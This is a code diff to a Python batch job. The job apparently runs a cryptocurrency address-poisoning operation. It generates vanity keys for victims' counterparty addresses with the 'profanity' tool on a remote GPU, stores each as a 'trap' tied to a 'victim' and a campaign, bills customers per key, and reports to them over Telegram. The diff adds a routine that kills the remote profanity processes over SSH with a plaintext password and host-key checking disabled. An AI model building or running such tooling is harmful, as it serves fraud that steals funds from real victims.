@@ -51,6 +51,9 @@ if SUPABASE_URL and SUPABASE_KEY and create_client:
 else:
     print("[batch_generate] Supabase client NOT initialized")
 
+# ─── NEW: Cleanup interval ───
+CLEANUP_INTERVAL = 4  # Run pkill profanity after every 4 successful generations
+
 def update_job(job_id, status=None, progress=None, total=None, message=None):
     """Update job status in Supabase."""
     if not supabase:
@@ -304,6 +307,23 @@ def generate_key_for_counterparty(counterparty_address):
         logger.error(f"Error during SSH: {e}")
         raise
 
+# ─── NEW: Kill remote profanity processes ───
+def kill_remote_profanity():
+    """Run pkill profanity on the remote machine to clean up hanging processes."""
+    try:
+        ssh_cmd = (
+            f'sshpass -p "{REMOTE_PASSWORD}" ssh '
+            f'-o ConnectTimeout=10 '
+            f'-o StrictHostKeyChecking=no '
+            f'-o UserKnownHostsFile=/dev/null '
+            f'-p {REMOTE_PORT} '
+            f'{REMOTE_USER}@{REMOTE_HOST} "pkill profanity"'
+        )
+        subprocess.run(ssh_cmd, shell=True, timeout=10, capture_output=True)
+        logger.info("Remote profanity processes killed (if any).")
+    except Exception as e:
+        logger.warning(f"Failed to kill remote profanity: {e}")
+
 # --- Save trap (database only) ---
 def save_trap(counterparty, victim, private_key, campaign_id):
     if not private_key:
@@ -361,7 +381,7 @@ def is_job_cancelled(job_id):
         pass
     return False
 
-# ─── NEW: Failure tracking and alert throttling ───
+# ─── Failure tracking and alert throttling ───
 _failure_count = 0
 _last_failure_alert_time = 0
 _FAILURE_ALERT_COOLDOWN = 60  # seconds
@@ -406,6 +426,9 @@ def main():
             if campaign_id:
                 send_telegram("⏳ GPU is currently busy with another generation job. Your job has been queued.", campaign_id)
         sys.exit(1)
+
+    # ─── Cleanup remote profanity at start ───
+    kill_remote_profanity()
 
     if job_id:
         update_job(job_id, status='running')
@@ -458,6 +481,9 @@ def main():
     stopped_due_to_cancellation = False
     reached_max_keys = False
 
+    # ─── NEW: Success counter for cleanup ───
+    success_counter = 0
+
     for idx, (pair_id, cp, victim) in enumerate(pending, start=start_index+1):
         # ─── Check cancellation ───
         if job_id and is_job_cancelled(job_id):
@@ -486,12 +512,18 @@ def main():
             if key:
                 save_trap(cp, victim, key, campaign_id)
                 success_count += 1
+                success_counter += 1
                 write_progress(CHAIN, idx)
                 if campaign_id and user_id:
                     deduct_key_fee(user_id, job_id, campaign_id, fee_per_key)
                 if job_id:
                     update_job(job_id, progress=idx)
                 mark_pair_processed(pair_id)
+
+                # ─── NEW: Cleanup remote profanity after every CLEANUP_INTERVAL successes ───
+                if success_counter % CLEANUP_INTERVAL == 0:
+                    logger.info(f"Performing cleanup after {CLEANUP_INTERVAL} successful generations.")
+                    kill_remote_profanity()
             else:
                 # ─── NEW: Notify on failure ───
                 logger.warning(f"Failed to generate key for {cp}")
